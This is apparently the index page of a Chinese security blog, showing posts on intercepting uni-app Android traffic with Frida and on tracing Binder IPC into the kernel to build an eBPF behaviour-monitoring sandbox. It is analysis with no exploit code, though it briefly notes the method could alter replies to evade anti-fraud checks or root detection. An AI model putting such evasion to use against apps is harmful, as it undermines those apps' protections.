<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"windy-purple.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="windy_ll">
<meta property="og:url" content="https://windy-purple.github.io/index.html">
<meta property="og:site_name" content="windy_ll">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="windy_ll">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://windy-purple.github.io/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>windy_ll</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">windy_ll</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://windy-purple.github.io/2024/11/11/01/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="windy_ll">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="windy_ll">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/11/01/" class="post-title-link" itemprop="url">UNI-APP渗透测试</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2024-11-11 22:42:01 / 修改时间：22:45:50" itemprop="dateCreated datePublished" datetime="2024-11-11T22:42:01+08:00">2024-11-11</time>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>767</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="UNI-APP渗透测试-抓包"><a href="#UNI-APP渗透测试-抓包" class="headerlink" title="UNI-APP渗透测试-抓包"></a>UNI-APP渗透测试-抓包</h1><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>   <strong>uni-app 是一个使用 Vue.js 开发所有前端应用的框架，开发者编写一套代码，可发布到iOS、Android、Web（响应式）、以及各种小程序（微信&#x2F;支付宝&#x2F;百度&#x2F;头条&#x2F;飞书&#x2F;QQ&#x2F;快手&#x2F;钉钉&#x2F;淘宝）、快应用等多个平台。</strong></p>
<p>   <strong>现在工作上遇到的uni-app越来越多了，需求主要集中在抓包上,简单记录一下</strong></p>
<hr>
<h2 id="二、特征识别"><a href="#二、特征识别" class="headerlink" title="二、特征识别"></a>二、特征识别</h2><h3 id="特征点一"><a href="#特征点一" class="headerlink" title="特征点一"></a>特征点一</h3><p>   <strong>最明显的特征点是在APK包解压缩之后，在根目录下存在<code>dc/squareup</code>目录，如下所示：</strong></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/uni-app/1.png" alt="1.png"></p>
<h3 id="特征点二"><a href="#特征点二" class="headerlink" title="特征点二"></a>特征点二</h3><p>   <strong>反编译之后，存在<code>dc/squareup</code>和<code>uni.UNIXXX</code>开头的包，如下图所示：</strong></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/uni-app/2.png" alt="2.png"></p>
<p><strong>有这两个特征基本就可以确认一个APP是否是<code>uni-app</code>开发的了，其他的没啥写的必要了</strong></p>
<hr>
<h2 id="三、抓包"><a href="#三、抓包" class="headerlink" title="三、抓包"></a>三、抓包</h2><p>   <strong>app的抓包方法很多，挂代理、VPN、HOOK、tcpdump等，翻了一下uni-app的官方文档，发现它不仅有证书校验还有代理检查，挂代理抓麻烦，有时候还不知道为啥抓不到；VPN去抓复制麻烦；tcpdump去抓，不直观，用ecapture去抓倒是直观，但是遇到只走http的报文就抓瞎了；最后还是选择frida吧，但是网上找了半天，没找到现成的脚本，只好写了一个(原理很简单，uni-app底层还是走的okhttp3那一套，稍微改了一下，但核心基本没变，这里直接选用<code>getResponseWithInterceptorChain</code>函数取得<code>request</code>和<code>response</code>对象即可)</strong></p>
<p>   <strong>脚本链接: <a target="_blank" rel="noopener" href="https://github.com/windy-purple/uni_app-Packet-capture">https://github.com/windy-purple/uni_app-Packet-capture</a></strong></p>
<p><strong>拿工作中遇到的两款APP展示一下效果</strong></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/uni-app/3.png" alt="3.png"></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/uni-app/4.png" alt="4.png"></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/uni-app/5.png" alt="5.png"></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/uni-app/6.png" alt="6.png"></p>
<hr>
<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-252129.htm">https://bbs.kanxue.com/thread-252129.htm</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://windy-purple.github.io/2024/04/24/19/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="windy_ll">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="windy_ll">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/04/24/19/" class="post-title-link" itemprop="url">ebpf在Android安全上的应用：结合binder完成一个行为检测沙箱(下篇)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-04-24 19:00:19" itemprop="dateCreated datePublished" datetime="2024-04-24T19:00:19+08:00">2024-04-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-11-12 23:35:41" itemprop="dateModified" datetime="2024-11-12T23:35:41+08:00">2024-11-12</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>4.7k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>8 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="ebpf在Android安全上的应用：结合binder完成一个行为检测沙箱-下篇"><a href="#ebpf在Android安全上的应用：结合binder完成一个行为检测沙箱-下篇" class="headerlink" title="ebpf在Android安全上的应用：结合binder完成一个行为检测沙箱(下篇)"></a>ebpf在Android安全上的应用：结合binder完成一个行为检测沙箱(下篇)</h1><h2 id="一、IPC简单介绍"><a href="#一、IPC简单介绍" class="headerlink" title="一、IPC简单介绍"></a>一、IPC简单介绍</h2><p>   <strong>IPC是Inter-Process Communication的缩写，含义为进程间通信或者跨进程通信，是指两个进程之间进行数据交换的过程。</strong></p>
<p>   <strong>Android在什么时候会有跨进程通信的需要？Android在请求系统服务的时候会有跨进程通信的需求，例如访问手机通讯录、获取定位等等行为，本文的目标即是实现一个简易的捕捉这些行为的沙箱</strong></p>
<hr>
<h2 id="二、binder简单介绍"><a href="#二、binder简单介绍" class="headerlink" title="二、binder简单介绍"></a>二、binder简单介绍</h2><p>   <strong>Binder是Android中的一种跨进程通信方式，可以理解为是IPC的一种具体实现方式</strong></p>
<hr>
<h2 id="三、ServiceManager简单介绍"><a href="#三、ServiceManager简单介绍" class="headerlink" title="三、ServiceManager简单介绍"></a>三、ServiceManager简单介绍</h2><p>   <strong><code>ServiceManager</code>是Android中一个及其重要的系统服务，从它的名称上就可以知道，它是用于管理系统服务的</strong></p>
<p>   <strong><code>ServiceManager</code>由<code>init</code>进程启动</strong></p>
<p>   <strong><code>ServiceManager</code>负责了以下的一些功能：服务的注册与查找、进程间通信、系统服务的启动与唤醒、提供系统服务的清单实例</strong></p>
<p>   <strong><code>binder</code>驱动决定了底层的通信详情，那么<code>ServiceManager</code>则相当于导航，告诉具体的通信该怎么走，达到那里等</strong></p>
<hr>
<h2 id="四、通信分析"><a href="#四、通信分析" class="headerlink" title="四、通信分析"></a>四、通信分析</h2><h3 id="4-1-客户端调用JAVA层分析"><a href="#4-1-客户端调用JAVA层分析" class="headerlink" title="4.1 客户端调用JAVA层分析"></a>4.1 客户端调用JAVA层分析</h3><p>   <strong>以<code>WifiManager</code>类的<code>getConnectInfo</code>函数(该函数获取wifi信息)为例进行分析</strong></p>
<p>   <strong><code>ctrl+左键</code>查看引用，可以发现该函数定义在<code>android.net.wifi.WifiManager</code>类中，如下图所示：</strong></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/1.png"></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/2.png"></p>
<p>   <strong>从上图可以看到，<code>getConnectInfo</code>函数具体代码只有一句<code>throw new RuntimeException(&quot;Stub!&quot;);</code>，这告诉我们这个函数是由rom中相同的类去替代执行，该函数在这被定义是编译所需要(PS:可以参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/ttkatrina/article/details/76180641">https://blog.csdn.net/ttkatrina/article/details/76180641</a>)，在android源码中的目录<code>frameworks/base/wifi/java/amdroid/net/wifi</code>下我们可以找到该类，然后找到该函数的具体实现，如下图所示：</strong></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/3.png"></p>
<p>   <strong>可以发现该函数调用了<code>IWifiManager</code>的<code>getConnectionInfo</code>函数，在<code>frameworks/base/wifi/java/amdroid/net/wifi</code>目录下可以找到<code>IWifiManager.aidl</code>文件，该aidl中定义了<code>getConnectionInfo</code>函数，如下图所示：</strong></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/4.png"></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/5.png"></p>
<p>   <strong>这里需要引入一个概念 — <code>AIDL</code>，<code>AIDL</code>是android的一种接口语言，用于公开android服务的接口，以此来实现跨进程的函数调用。<code>AIDL</code>在编译时会生成两个类，即<code>Stub</code>和<code>Proxy</code>两个类，<code>Stub</code>类是服务端抽象层的体现，<code>Proxy</code>是客户端获取的实例，android通过<code>proxy-stub</code>这种设计模式实现了IPC</strong></p>
<p>   <strong>下面写一个aidl文件然后生成相应的java代码来看看是怎么实现调用的，首先，我们在android studio中随便找一个项目，然后新建一个aidl文件，如下图所示：</strong></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/6.png"></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/7.png"></p>
<p>   <strong>然后<code>Build-&gt;Make Probject</code>即可生成，生成的路径位于<code>build/generated/aidl_source_output_dir/debug/out/包名</code>，如下图所示：</strong></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/8.png"></p>
<p>   <strong>观察生成后的java文件可发现，<code>Proxy</code>类已经生成，在<code>Proxy</code>类中我们可以找到我们定义的函数，如下图所示：</strong></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/9.png"></p>
<p>   <strong>具体分析一下该函数，首先通过<code>obtain</code>函数生成了一个<code>Parcel</code>实例，然后调用<code>Parcel</code>的<code>write</code>系列函数进行写入，其实就是一个序列化的过程，然后调用了<code>IBinder</code>的<code>transact</code>函数，跟踪分析一下该函数，在目录<code>frameworks/base/core/java/android/os</code>下可以找到该java文件，如下图所示：</strong></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/10.png"></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/11.png"></p>
<p>   <strong>可以发现，<code>IBinder</code>仅仅是一个接口，其中定义了<code>transact</code>方法，该方法有4个参数，第一个参数<code>code</code>在我们的远程调用中为函数编号，服务端接受到这个编号后，会去寻找<code>Stub</code>类中的静态变量，从而解析出是调用那个函数，第二个和第三个参数<code>_data</code>、<code>_reply</code>为传入的参数和返回的值，都是经过序列化后的数据，最后一个参数<code>flags</code>为指示是否需要阻塞等待结果，0为阻塞等待，1为立即返回。</strong></p>
<p>   <strong>全局搜索一下，可以发现同目录下的<code>BinderProxy</code>类实现了该接口(PS:值得注意的是，同目录下面还存在一个<code>Binder</code>类，也实现了该接口，但<code>Binder</code>类是服务端的实现，而不是客户端的实现)，如下图所示：</strong></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/12.png"></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/13.png"></p>
<p>   <strong>分析该函数，可以发现最后走向了<code>transactNative</code>函数，到此为止，进行IPC通信客户端java层已经分析完毕</strong></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/14.png"></p>
<h3 id="4-2-客户端调用Native层分析"><a href="#4-2-客户端调用Native层分析" class="headerlink" title="4.2 客户端调用Native层分析"></a>4.2 客户端调用Native层分析</h3><p>   <strong>全局搜索一下<code>transactNative</code>函数，可以发现该函数在native层中注册信息，如下图所示：</strong></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/15.png"></p>
<p>   <strong>跟踪一下<code>android_os_BinderProxy_transact</code>函数，可以发现该函数首先通过<code>getBPNativeData(env, obj)-&gt;mObject.get()</code>获取到了一个<code>BpBinder</code>对象，然后调用了<code>BpBinder</code>的<code>transact</code>函数，如下图所示：</strong></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/16.png"></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/17.png"></p>
<p>   <strong>继续跟进下去，可以发现进入了<code>IPCThreadState</code>的<code>transact</code>函数，如下图所示：</strong></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/18.png"></p>
<p>   <strong>接着跟进，可以发现首先调用<code>writeTransactionData</code>函数，该函数作用为填充<code>binder_transaction_data</code>结构体，为发送到binder驱动做准备，然后调用<code>waitForResponse</code>等待返回，如下图所示：</strong></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/19.png"></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/20.png"></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/21.png"></p>
<p>   <strong>跟进<code>waitForResponse</code>函数，可以发现该函数最重要的就是调用<code>talkWithDriver</code>函数，分析一下<code>talkWithDriver</code>函数，可以发现最终调用了<code>ioctl</code>，如下图所示：</strong></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/22.png"></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/23.png"></p>
<p>   <strong>到处为止，客户端native层分析完毕</strong></p>
<h3 id="4-3-内核层分析-binder驱动分析"><a href="#4-3-内核层分析-binder驱动分析" class="headerlink" title="4.3 内核层分析(binder驱动分析)"></a>4.3 内核层分析(binder驱动分析)</h3><p>   <strong>到此处，我们的ebpf程序就可以开始捕捉然后解析数据格式了</strong></p>
<p>   <strong>当用户层调用<code>ioctl</code>时，会进入内核态，进入<code>binder_ioctl</code>内核函数(ps:可在内核设备源码中的<code>binder.c</code>找到相应的描述符)，分析一下<code>binder_ioctl</code>函数，可发现该函数主要作用为在两个进程之间首发数据，我们的通信数据<code>ioctl</code>命令是<code>BINDER_WRITE_READ</code>，当遇到该命令的时候，会调用<code>binder_ioctl_write_read</code>函数，如下图所示：</strong></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/24.png"></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/25.png"></p>
<p>   <strong>跟进<code>binder_ioctl_write_read</code>函数，可以发现，该函数首先将<code>unsigned long</code>类型的<code>arg</code>参数指向的地址的值读取到结构体<code>binder_write_read</code>中，说明当<code>ioctl</code>命令为<code>BINDER_WRITE_READ</code>时，传递进来的参数为指向结构的<code>binder_write_read</code>的指针，如下图所示：</strong></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/26.png"></p>
<p>   <strong>到这里其实我们内核态的分析已经可以结束了，我们已经观察到了我们想要的数据了，即<code>binder_write_read</code>结构体，可以看一下该结构体的定义，如下所示：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">binder_write_read</span> &#123;</span></span><br><span class="line">	<span class="type">binder_size_t</span> write_size; <span class="comment">/* 写内容的数据总大小 */</span></span><br><span class="line">	<span class="type">binder_size_t</span> write_consumed; <span class="comment">/* 记录了从缓冲区读取写内容的大小 */</span></span><br><span class="line">	<span class="type">binder_uintptr_t</span> write_buffer; <span class="comment">/* 写内容的数据的虚拟地址 */</span></span><br><span class="line">	<span class="type">binder_size_t</span> read_size; <span class="comment">/* 读内容的数据总大小 */</span></span><br><span class="line">	<span class="type">binder_size_t</span> read_consumed; <span class="comment">/* 记录了从缓冲区读取读内容的大小 */</span></span><br><span class="line">	<span class="type">binder_uintptr_t</span> read_buffer; <span class="comment">/* 读内容的数据的虚拟地址 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>   <strong>这个结构体是用来描述进程间通信过程中所传输的数据，我们读取从客户端发送到服务端的通信包只需要关注<code>write_size</code>、<code>write_consumed</code>、<code>write_buffer</code>，其中，<code>write_buffer</code>指向的是一个数组，这个数组中就包含了<code>binder_transaction_data</code>结构体，这个结构体在native层<code>writeTransactionData</code>函数填充的，我们的目标通信包即是这个结构体，其中，<code>write_buffer</code>和<code>read_buffer</code>指向的数据结构大致如下：</strong></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/27.png"></p>
<p>   <strong>一般来说，驱动会一次性传递多条命令和地址的组合，而我们要在其中找到<code>binder_transaction_data</code>结构体对应的指令，在<code>binder.h</code>头文件中我们可以找到驱动定义的所有指令(<a target="_blank" rel="noopener" href="https://android.googlesource.com/kernel/common/+/refs/heads/android-mainline/include/uapi/linux/android/binder.h">https://android.googlesource.com/kernel/common/+/refs/heads/android-mainline/include/uapi/linux/android/binder.h</a>)，如下图所示：</strong></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/28.png"></p>
<p>   <strong>可以发现，<code>BC_TRANSACTION</code>和<code>BC_REPLY</code>指令都对应着<code>binder_transaction_data</code>结构体参数，但我们只需要客户端发往驱动的数据包，所以我们只需要<code>BC_TRANSACTION</code>指令对应的参数即可</strong></p>
<p>   <strong>经过上面的分析，我们找到了我们需要的核心数据—<code>binder_transaction_data</code>结构体，现在来看一下该结构体的定义，定义如下：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">struct binder_transaction_data &#123;</span><br><span class="line">	union &#123;</span><br><span class="line">		__u32 handle;</span><br><span class="line">		binder_uintptr_t ptr;</span><br><span class="line">	&#125; target; /* 该事务的目标对象 */</span><br><span class="line">	binder_uintptr_t cookie; /* 只有当事务是由Binder驱动传递给用户空间时，cookie才有意思，它的值是处理该事务的Server位于C++层的本地Binder对象 */</span><br><span class="line">	__u32 code; /* 方法编号 */</span><br><span class="line">	__u32 flags;</span><br><span class="line">	pid_t sender_pid;</span><br><span class="line">	uid_t sender_euid;</span><br><span class="line">	binder_size_t data_size; /* 数据长度 */</span><br><span class="line">	binder_size_t offsets_size; /* 若包含对象，对象的数据大小 */</span><br><span class="line">	union &#123;</span><br><span class="line">		struct &#123;</span><br><span class="line">			binder_uintptr_t buffer; /* 参数地址 */</span><br><span class="line">			binder_uintptr_t offsets; /* 参数对象地址 */</span><br><span class="line">		&#125; ptr;</span><br><span class="line">		__u8 buf[8];</span><br><span class="line">	&#125; data; /* 数据 */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>   <strong>有了该数据结构，我们就可以知道客户端调用服务端的函数的函数、参数等数据了</strong></p>
<hr>
<h2 id="五、实现效果"><a href="#五、实现效果" class="headerlink" title="五、实现效果"></a>五、实现效果</h2><p>   <strong>PS：整套系统用于商业，就不做开源处理了，这里只给出核心结构体打印的截图，就不再发前端的截图了</strong></p>
<p><strong>读取手机通讯录(ps:这里读取出来的数据采用了Toast打印的，所以将捕捉到的Toast相应的通信包也一起打印了出来，下同)：</strong></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/29.png"></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/30.png"></p>
<p><strong>获取地理位置：</strong></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/31.png"></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/32.png"></p>
<p><strong>获取wifi信息：</strong></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/33.png"></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf2/34.png"></p>
<hr>
<h2 id="六、其他"><a href="#六、其他" class="headerlink" title="六、其他"></a>六、其他</h2><p>   <strong>上面其实我们只分析到了发送部分，反过来，其实我们也可以读取返回包甚至于修改返回包，就可用于对风控的对抗，例如在内核态中修改APP请求的设备标识信息(当然前提是app走系统提供的驱动通信)，亦或者用于逆向的工作，例如过root检测等等。</strong></p>
<p>   <strong>这部分验证代码就暂不放出来了，感兴趣的可以自己实现一下</strong></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://windy-purple.github.io/2024/04/24/39/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="windy_ll">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="windy_ll">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/04/24/39/" class="post-title-link" itemprop="url">ebpf在Android安全上的应用：ebpf的一些基础知识(上篇)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-04-24 18:36:39" itemprop="dateCreated datePublished" datetime="2024-04-24T18:36:39+08:00">2024-04-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-11-12 23:21:32" itemprop="dateModified" datetime="2024-11-12T23:21:32+08:00">2024-11-12</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>7.1k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>13 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="ebpf在Android安全上的应用：ebpf的一些基础知识-上篇"><a href="#ebpf在Android安全上的应用：ebpf的一些基础知识-上篇" class="headerlink" title="ebpf在Android安全上的应用：ebpf的一些基础知识(上篇)"></a>ebpf在Android安全上的应用：ebpf的一些基础知识(上篇)</h1><h2 id="一、ebpf介绍"><a href="#一、ebpf介绍" class="headerlink" title="一、ebpf介绍"></a>一、ebpf介绍</h2><p>   <strong>eBPF 是一项革命性的技术，起源于 Linux 内核，它可以在特权上下文中（如操作系统内核）运行沙盒程序。它用于安全有效地扩展内核的功能，而无需通过更改内核源代码或加载内核模块的方式来实现。（PS：介绍来源于<a target="_blank" rel="noopener" href="https://ebpf.io/zh-cn/what-is-ebpf/">https://ebpf.io/zh-cn/what-is-ebpf/</a>）</strong></p>
